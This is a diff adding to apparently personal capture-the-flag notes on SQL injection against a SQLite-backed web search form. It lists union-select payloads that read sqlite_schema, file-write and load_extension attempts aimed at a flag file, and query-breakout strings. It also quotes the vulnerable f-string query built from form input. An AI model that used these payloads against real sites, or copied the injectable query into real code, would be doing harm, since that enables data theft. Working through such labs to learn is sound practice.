@@ -136,3 +136,14 @@ FROM (
 - a%'union select name from sqlite_schema into outfile "radha1.txt"/*-500
 - a%'union select name from sqlite_schema into outfile 'radha1.txt'/*-500
 - a%'union select name from sqlite_schema into outfile './radha1.txt'/*
+### load_extension --not workign
+- load_extension https://docs.python.org/3/library/sqlite3.html
+-  Load the fulltext search extension
+- con.execute("select load_extension('./fts3.so')")
+a%'union select load_extension ('./flag.txt')/*
+### close and open query
+- a%'union select name from sqlite_schema/*
+-  query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
+-   a%'")\nquery=db.execute("select "1")/* -500
+-   a%'union (select (create table radha(col1 text) as "1"/* -500
+  
